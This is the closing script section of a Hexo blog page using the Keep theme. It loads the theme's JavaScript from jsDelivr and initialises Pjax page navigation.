    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/local-search.js"></script>



    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/code-block.js"></script>



    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/lazyload.js"></script>


<div class="post-scripts pjax">
    
        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/post-helper.js"></script>
        
            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/libs/anime.min.js"></script>
        
        
            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/toc.js"></script>
        
    
</div>


    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/libs/pjax.min.js"></script>
<script>
    window.addEventListener('DOMContentLoaded', () => {
        window.pjax = new Pjax({
            selectors: [
                'head title',
                '.page-container',
                '.pjax'
            ],
            history: true,
            debug: false,
            cacheBust: false,
            timeout: 0,
            analytics: false,
            currentUrlFullReload: false,
            scrollRestoration: false,
            // scrollTo: true,
        });

        document.addEventListener('pjax:send', () => {
            KEEP.utils.pjaxProgressBarStart();
        });

        document.addEventListener('pjax:complete', () => {
            KEEP.utils.pjaxProgressBarEnd();
            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
            KEEP.refresh();
        });
    });
</script>



</body>
</html>
